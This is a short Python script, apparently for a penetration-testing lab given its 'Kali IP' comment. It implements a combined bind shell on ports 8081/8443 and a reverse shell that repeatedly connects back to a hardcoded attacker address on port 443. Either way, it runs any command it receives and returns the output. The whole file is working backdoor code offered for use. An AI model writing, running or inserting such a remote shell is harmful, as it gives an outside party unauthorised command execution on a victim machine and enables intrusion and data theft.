# agent_hybrid.py
import socket
import subprocess
import threading
import time

BIND_PORTS = [8081, 8443]
REVERSE_HOST = "192.168.56.103"  # Kali IP (change this!)
REVERSE_PORT = 443

def handle_client(conn):
    conn.send(b"[*] Connected to agent.\n")
    while True:
        conn.send(b"\nShell> ")
        try:
            cmd = conn.recv(1024).decode().strip()
            if not cmd:
                continue
            if cmd == "exit":
                break
            output = subprocess.getoutput(cmd)
            conn.send(output.encode() + b"\n")
        except:
            break
    conn.close()

def bind_shell():
    for port in BIND_PORTS:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(("0.0.0.0", port))
            server.listen(1)
            print(f"[+] Bind shell listening on port {port}")
            client_socket, addr = server.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            handle_client(client_socket)
            return True
        except:
            continue
    return False

def reverse_shell():
    try:
        while True:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                client.connect((REVERSE_HOST, REVERSE_PORT))
                handle_client(client)
                break
            except:
                time.sleep(5)
    except Exception as e:
        print(f"[!] Reverse shell failed: {e}")

def main():
    print("[*] Trying bind shell...")
    if not bind_shell():
        print("[!] Bind shell failed. Switching to reverse shell.")
    reverse_shell()

if __name__ == "__main__":
    main()
